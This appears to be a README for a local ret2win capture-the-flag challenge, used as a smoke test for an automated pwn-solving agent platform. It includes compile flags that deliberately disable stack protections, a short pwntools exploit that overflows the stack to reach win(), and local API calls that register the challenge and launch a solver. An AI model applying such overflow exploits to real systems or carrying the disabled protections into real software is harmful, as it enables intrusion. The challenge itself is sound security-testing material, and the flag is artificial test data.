# Simple Pwn Ret2win

This is a minimal local pwn smoke test for BreachWeave.

The challenge is intentionally simple:

- `chall.c` contains a stack overflow in `vuln`.
- `win()` prints the flag.
- The binary should be compiled as non-PIE with stack canary disabled.

Expected flag:

```text
flag{simple_ret2win_local_test}
```

## Build

From the repository root on PowerShell:

```powershell
docker run --rm -v "${PWD}\local-ctf\simple-pwn:/work" -w /work tch-agent:latest bash -lc "gcc -O0 -fno-stack-protector -no-pie -z noexecstack -o chall chall.c && file chall && checksec --file=chall || true"
```

The generated `chall` ELF is ignored by git.

## Manual Exploit Check

```powershell
docker run --rm -v "${PWD}\local-ctf\simple-pwn:/work" -w /work tch-agent:latest bash -lc "python3 - <<'PY'
from pwn import *
elf = ELF('./chall', checksec=False)
io = process('./chall')
payload = b'A' * 72 + p64(elf.symbols['win'])
io.sendline(payload)
print(io.recvall(timeout=2).decode(errors='replace'))
PY"
```

## Platform Smoke Test

Start the Web UI:

```powershell
bun run web
```

Enable mock challenge mode:

```powershell
$body = @{ challenge = @{ mockEnabled = $true }; planner = @{ enabled = $false } } | ConvertTo-Json -Depth 5
Invoke-WebRequest -Uri http://127.0.0.1:3000/api/config/host-settings -Method POST -ContentType 'application/json' -Body $body -UseBasicParsing
```

Create the mock challenge:

```powershell
$body = @{
  id = 'simple-pwn'
  title = 'Simple Pwn Ret2win'
  difficulty = 'easy'
  description = 'Local pwn smoke test. Attachments include a Linux x86_64 ELF named chall. Exploit the stack overflow and submit the flag printed by win().'
  level = 1
  total_score = 100
  total_got_score = 0
  flags = @('flag{simple_ret2win_local_test}')
  entrypoint = @()
} | ConvertTo-Json -Depth 5
Invoke-WebRequest -Uri http://127.0.0.1:3000/api/challenges -Method POST -ContentType 'application/json' -Body $body -UseBasicParsing
```

Copy attachments into the local challenge store:

```powershell
$dest = Join-Path $env:USERPROFILE '.tch-agent\challenge\mock-simple-pwn\attachments'
New-Item -ItemType Directory -Force -Path $dest | Out-Null
Copy-Item -LiteralPath .\local-ctf\simple-pwn\chall -Destination (Join-Path $dest 'chall') -Force
Copy-Item -LiteralPath .\local-ctf\simple-pwn\chall.c -Destination (Join-Path $dest 'chall.c') -Force
Copy-Item -LiteralPath .\local-ctf\simple-pwn\README.md -Destination (Join-Path $dest 'README.md') -Force
```

Launch the pwn solver:

```powershell
$body = @{ promptName = 'ctf-pwn-solver' } | ConvertTo-Json
Invoke-WebRequest -Uri http://127.0.0.1:3000/api/challenges/mock-simple-pwn/solvers -Method POST -ContentType 'application/json' -Body $body -UseBasicParsing
```
